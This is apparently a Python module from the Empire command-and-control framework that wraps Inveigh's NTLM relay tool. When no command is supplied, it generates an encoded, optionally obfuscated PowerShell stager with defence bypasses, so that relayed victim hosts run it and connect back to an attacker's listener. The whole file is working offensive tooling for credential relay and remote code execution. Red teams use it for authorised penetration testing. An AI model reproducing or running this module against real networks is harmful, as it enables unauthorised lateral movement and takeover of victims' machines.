from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy_"]
        proxyCreds = params["ProxyCreds"]
        command = params["Command"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        if command == "":
            if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
                # not a valid listener, return nothing for the script
                raise ModuleValidationException("Invalid listener: " + listener_name)

            else:
                # generate the PowerShell one-liner with all of the proper options set
                command = main_menu.stagers.generate_launcher(
                    listenerName=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=launcher_obfuscate,
                    obfuscation_command=launcher_obfuscate_command,
                    userAgent=user_agent,
                    proxy=proxy,
                    proxyCreds=proxyCreds,
                    bypasses=params["Bypasses"],
                )

                # check if launcher errored out. If so return nothing
                if command == "":
                    raise ModuleValidationException("Error in launcher generation.")

        # set defaults for Empire
        script_end = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \\"%s\\"' % (
            command
        )

        for option, values in params.items():
            if (
                (
                    option.lower() != "agent"
                    and option.lower() != "listener"
                    and option.lower() != "useragent"
                    and option.lower() != "proxy_"
                    and option.lower() != "proxycreds"
                    and option.lower() != "command"
                )
                and values
                and values != ""
            ):
                if values.lower() == "true":
                    # if we're just adding a switch
                    script_end += " -" + str(option)
                else:
                    if "," in str(values):
                        quoted = '"' + str(values).replace(",", '","') + '"'
                        script_end += " -" + str(option) + " " + quoted
                    else:
                        script_end += " -" + str(option) + ' "' + str(values) + '"'

        return script, script_end
